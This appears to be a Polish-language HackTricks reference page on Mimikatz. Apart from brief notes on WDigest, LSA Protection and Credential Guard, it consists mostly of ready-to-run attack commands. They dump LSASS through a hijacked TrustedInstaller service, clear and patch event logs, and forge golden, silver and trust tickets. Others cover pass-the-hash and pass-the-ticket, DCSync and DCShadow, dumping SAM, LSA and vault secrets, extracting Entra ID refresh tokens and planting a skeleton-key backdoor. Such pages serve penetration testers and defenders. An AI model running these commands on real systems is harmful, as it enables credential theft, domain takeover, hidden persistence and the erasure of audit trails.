# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ta strona bazuje na stronie [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Więcej informacji znajdziesz w oryginale!<sup>[[3]](#references)</sup>

## LM i tekst jawny w pamięci

Od Windows 8.1 i Windows Server 2012 R2 wprowadzono istotne środki ochrony przed kradzieżą poświadczeń:

- **Skróty LM i hasła w postaci zwykłego tekstu** nie są już przechowywane w pamięci, aby zwiększyć bezpieczeństwo. Aby wyłączyć uwierzytelnianie Digest i zapobiec buforowaniu haseł w „postaci jawnej” w LSASS, należy ustawić wartość DWORD `0` dla odpowiedniego wpisu rejestru: _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_.

- **LSA Protection** wprowadzono, aby chronić proces Local Security Authority (LSA) przed nieautoryzowanym odczytem pamięci i wstrzykiwaniem kodu. Osiąga się to przez oznaczenie LSASS jako procesu chronionego. Aby aktywować LSA Protection:
  1. Zmodyfikuj rejestr pod kluczem _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, ustawiając `RunAsPPL` na `dword:00000001`.
  2. Wdróż obiekt zasad grupy (GPO), który wymusza tę zmianę rejestru na zarządzanych urządzeniach.

Mimo tych zabezpieczeń narzędzia takie jak Mimikatz mogą obejść LSA Protection za pomocą określonych sterowników, choć takie działania prawdopodobnie zostaną odnotowane w dziennikach zdarzeń.

Na nowoczesnych stacjach roboczych ma to jeszcze większe znaczenie, ponieważ **Credential Guard jest domyślnie włączony na wielu systemach Windows 11 22H2+ i Windows Server 2025 dołączonych do domeny, które nie są kontrolerami domeny**, a **LSASS-as-PPL jest domyślnie włączony na świeżych instalacjach Windows 11 22H2+**. W praktyce oznacza to, że `sekurlsa::logonpasswords` często ujawnia mniej danych, niż można było oczekiwać na podstawie starszych technik, a operatorzy coraz częściej sięgają po **offline minidumpy**, **ekstrakcję kluczy Kerberos (`sekurlsa::ekeys`)** lub **moduły związane z CloudAP/PRT**. Informacje o mechanizmach ochrony znajdziesz na stronie [Windows credentials protections](credentials-protections.md).

### Przeciwdziałanie usunięciu SeDebugPrivilege

Administratorzy zazwyczaj mają SeDebugPrivilege, który umożliwia im debugowanie programów. To uprawnienie można ograniczyć, aby zapobiec nieautoryzowanemu tworzeniu zrzutów pamięci — częstej technice używanej przez atakujących do wyodrębniania poświadczeń z pamięci. Jednak nawet po odebraniu tego uprawnienia konto TrustedInstaller nadal może tworzyć zrzuty pamięci, używając niestandardowej konfiguracji usługi:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Pozwala to zrzucić pamięć procesu `lsass.exe` do pliku, który można następnie przeanalizować na innym systemie w celu wyodrębnienia poświadczeń:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Opcje Mimikatz

Manipulowanie dziennikami zdarzeń w Mimikatz obejmuje dwie główne czynności: czyszczenie dzienników zdarzeń i patchowanie usługi Event, aby zapobiec rejestrowaniu nowych zdarzeń. Poniżej znajdują się polecenia służące do wykonania tych czynności:

#### Czyszczenie dzienników zdarzeń

Mimikatz udostępnia polecenie `event::clear`. Wywołuje ono interfejs API Windows do czyszczenia wybranego klasycznego dziennika zdarzeń. Domyślnie jest to `Security`; opcja `/log:` pozwala wybrać inny dziennik, a osoba wywołująca polecenie musi mieć uprawnienia do jego wyczyszczenia. Nie jest to to samo co `event::drop`, które próbuje zatrzymać zapisywanie nowych rekordów.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Funkcja eksperymentalna: patchowanie usługi zdarzeń

- **Polecenie**: `event::drop`
- To eksperymentalne polecenie modyfikuje działanie usługi Event Logging Service, skutecznie uniemożliwiając jej rejestrowanie nowych zdarzeń.
- Przykład: `mimikatz "privilege::debug" "event::drop" exit`

- Polecenie `privilege::debug` zapewnia Mimikatz uprawnienia niezbędne do modyfikowania usług systemowych.
- Polecenie `event::drop` patchuje następnie usługę Event Logging.

### Ataki na bilety Kerberos

Użyj poniższych poleceń jako szybkiego przypomnienia składni. Dedykowane strony poświęcone [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) i [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zawierają aktualne informacje o niuansach związanych z AES/PAC/opsec.

### Tworzenie Golden Ticket

Golden Ticket umożliwia podszywanie się pod użytkowników z dostępem do całej domeny. Kluczowe polecenie i parametry:

- Polecenie: `kerberos::golden`
- Parametry:
  - `/domain`: Nazwa domeny.
  - `/sid`: Identyfikator zabezpieczeń domeny (SID).
  - `/user`: Nazwa użytkownika, pod którego chcesz się podszyć.
  - `/krbtgt`: Hash NTLM konta usługi KDC domeny.
  - `/ptt`: Bezpośrednio wstrzykuje bilet do pamięci.
  - `/ticket`: Zapisuje bilet do późniejszego użycia.

Przykład:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Tworzenie Silver Ticket

Silver Tickets zapewniają dostęp do określonych usług. Kluczowe polecenie i parametry:

- Polecenie: Podobne do Golden Ticket, ale dotyczy określonych usług.
- Parametry:
  - `/service`: Usługa, której dotyczy polecenie (np. cifs, http).
  - Pozostałe parametry są podobne do tych używanych w przypadku Golden Ticket.

Przykład:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Tworzenie Trust Ticket

Trust Tickets służą do uzyskiwania dostępu do zasobów w różnych domenach dzięki wykorzystaniu relacji zaufania. Kluczowa komenda i parametry:

- Komenda: podobna do Golden Ticket, ale przeznaczona do relacji zaufania.
- Parametry:
  - `/target`: FQDN domeny docelowej.
  - `/rc4`: hash NTLM konta relacji zaufania.

Przykład:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Dodatkowe polecenia Kerberos

- **Wyświetlanie biletów**:

  - Polecenie: `kerberos::list`
  - Wyświetla wszystkie bilety Kerberos bieżącej sesji użytkownika.

- **Pass the Cache**: `kerberos::ptc` odczytuje plik MIT/Heimdal `.ccache`, **a nie** plik `.kirbi`. Podaj ścieżkę do pliku jako argument pozycyjny: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` odczytuje plik `.kirbi` lub katalog zawierający takie pliki. Ścieżkę również podaje się jako argument pozycyjny, a nie za pomocą `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Szerszy opis procedury znajdziesz w sekcji [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md).<sup>[[6]](#references)</sup>

- **Czyszczenie biletów**:
  - Polecenie: `kerberos::purge`
  - Usuwa wszystkie bilety Kerberos z sesji.
  - Przydatne przed użyciem poleceń do manipulowania biletami, aby uniknąć konfliktów.

### Over-Pass-the-Hash / Pass-the-Key

Jeśli `RC4` jest wyłączone lub działa zawodnie, Mimikatz może wstrzyknąć **klucze Kerberos AES128/AES256** do bieżącej sesji logowania zamiast korzystać wyłącznie z hasha NT. Zwykle lepiej pasuje to do nowoczesnych domen niż traktowanie `sekurlsa::pth` jako techniki przeznaczonej wyłącznie do NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` ponownie wykorzystuje bieżący proces zamiast uruchamiać nową konsolę, co jest przydatne, gdy chcesz od razu uruchomić w tym samym kontekście polecenia takie jak `lsadump::dcsync`.

### Manipulowanie Active Directory

- **DCShadow**: Tymczasowo sprawia, że maszyna działa jako DC, aby manipulować obiektami AD. Zobacz [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naśladuje DC, aby zażądać danych haseł. Zobacz [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Dostęp do poświadczeń

- **LSADUMP::LSA**: Wyodrębnia poświadczenia z LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Podszywa się pod DC, używając danych hasła konta komputera.

  - _W oryginalnym kontekście nie podano konkretnego polecenia dla NetSync._

- **LSADUMP::SAM**: Uzyskuje dostęp do lokalnej bazy danych SAM.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Odszyfrowuje sekrety zapisane w rejestrze.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ustawia nowy hash NTLM dla użytkownika.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pobiera informacje uwierzytelniające dotyczące zaufania.
  - `mimikatz "lsadump::trust" exit`

### Poświadczenia w chmurze / Entra ID

Na hostach **Entra ID** lub **hybrid-joined** polecenie `sekurlsa::cloudap` może ujawnić zbuforowane dane **Primary Refresh Token (PRT)** z LSASS. Wartość `ProofOfPossesionKey.KeyValue` to chroniony przez DPAPI blob klucza sesji, a nie już odszyfrowany klucz.<sup>[[7]](#references)[[8]](#references)</sup> Aby użyć `/unprotect`, uruchom `dpapi::cloudapkd` jako `SYSTEM` (na przykład `token::elevate` w podwyższonej sesji Mimikatz) albo najpierw wypełnij pamięć podręczną kluczy Mimikatz za pomocą `sekurlsa::dpapi`. Samo `privilege::debug` nie zmienia kontekstu wywołującego DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Skopiuj **pasujące** `Context` i `Derived Key` z pierwszego polecenia do drugiego; Mimikatz generuje nowy kontekst, jeśli nie zostanie podany. Nawet w przypadku klucza chronionego przez TPM Mimikatz może wyprowadzić klucz podpisujący, używając TPM na oryginalnym urządzeniu. Nie trzeba eksportować jawnego klucza, ale pomyślne wyprowadzenie klucza może umożliwić podpisanie cookie przeglądarki.<sup>[[7]](#references)</sup>

Sam ciąg PRT nie wystarczy, ponieważ Microsoft Entra wymaga potwierdzenia posiadania powiązanego klucza sesji.<sup>[[9]](#references)</sup> Zobacz [odzyskiwanie klucza DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md), aby poznać inne opcje dotyczące kluczy głównych, oraz [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html), aby poznać łańcuch działań po stronie chmury.

### Różne

- **MISC::Skeleton**: Wstrzyknij backdoor do LSASS na DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacja uprawnień

- **PRIVILEGE::Backup**: Uzyskaj uprawnienia do tworzenia kopii zapasowych.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Uzyskaj uprawnienia debugowania.
  - `mimikatz "privilege::debug" exit`

### Zrzucanie poświadczeń

- **SEKURLSA::LogonPasswords**: Pokaż poświadczenia zalogowanych użytkowników.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Wyodrębnij bilety Kerberos z pamięci.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipulowanie SID i tokenami

- **SID::add/modify**: Zmień SID i SIDHistory.

  - Dodawanie: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modyfikowanie: _W oryginalnym kontekście nie podano konkretnego polecenia._

- **TOKEN::Elevate**: Podszywaj się pod tokeny.
  - `mimikatz "token::elevate /domainadmin" exit`

### Usługi terminalowe

- **TS::MultiRDP**: Zezwól na wiele sesji RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Wyświetl sesje TS/RDP.
  - _Nie podano konkretnego polecenia dla TS::Sessions._

### Vault

- Wyodrębnij hasła z Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Narzędzia hakerskie – moduły Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB i Entra ID: poznaj nowy przepływ pamięci podręcznej](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Dokumentacja poleceń Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Kod źródłowy modułu zdarzeń Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Kod źródłowy modułu ccache Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Kod źródłowy modułu Kerberos Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Implementacja DPAPI CloudAP w Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Bliższe spojrzenie na Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Ochrona Primary Refresh Token w Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
